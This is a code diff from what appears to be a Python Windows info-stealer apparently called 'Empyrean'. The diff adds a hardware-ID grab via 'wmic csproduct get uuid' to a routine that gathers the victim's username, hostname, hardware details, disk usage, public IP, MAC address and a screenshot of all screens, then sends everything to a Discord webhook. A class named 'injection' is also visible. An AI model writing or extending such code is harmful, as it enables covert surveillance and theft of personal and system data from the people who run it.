@@ -478,13 +478,12 @@ class system():
         embed = Embed(title="\u200b", color=0x000000)
 
         embed.add_field(name=":bust_in_silhouette: User", value=f"```Display Name: {self.get_display_name()}\nHostname: {os.getenv('COMPUTERNAME')}\nUsername: {os.getenv('USERNAME')}```", inline=False)
-        embed.add_field(name="<:CPU:1004131852208066701> System", value=f"```CPU: {wmi.WMI().Win32_Processor()[0].Name}\nGPU: {wmi.WMI().Win32_VideoController()[0].Name}\nRAM: {round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)}```", inline=False)
+        embed.add_field(name="<:CPU:1004131852208066701> System", value=f"```CPU: {wmi.WMI().Win32_Processor()[0].Name}\nGPU: {wmi.WMI().Win32_VideoController()[0].Name}\nRAM: {round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)}\nHWID: {self.get_hwid()}```", inline=False)
         embed.add_field(name=":floppy_disk: Disk", value=f"```{self.get_disk_space()}```", inline=False)
         embed.add_field(name="<:wifi:1004131855374749807> Network", value=f"```IP: {requests.get('https://api.ipify.org').text}\nMAC: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```", inline=False)
         
         ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None).save("screenshot.png")
         embed.set_image(url="attachment://screenshot.png")
-        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Windows_logo_-_2012_%28dark_blue%29.svg/2048px-Windows_logo_-_2012_%28dark_blue%29.svg.png")
         
         try:
             webhook.send(embed=embed, file=File('.\\screenshot.png', filename='screenshot.png'), username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
@@ -515,6 +514,12 @@ class system():
             disk += ("{:<9} "*4).format(part.device, f"{usage.free/float(1<<30):,.0f} GB", f"{usage.total/float(1<<30):,.0f} GB", usage.percent) + "\n"
         
         return disk
+    
+    def get_hwid(self):
+        p = subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        hwid = ((p.stdout.read() + p.stderr.read()).decode().split("\n")[1])
+        
+        return hwid
 
 class injection:
     def __init__(self, webhook: str):
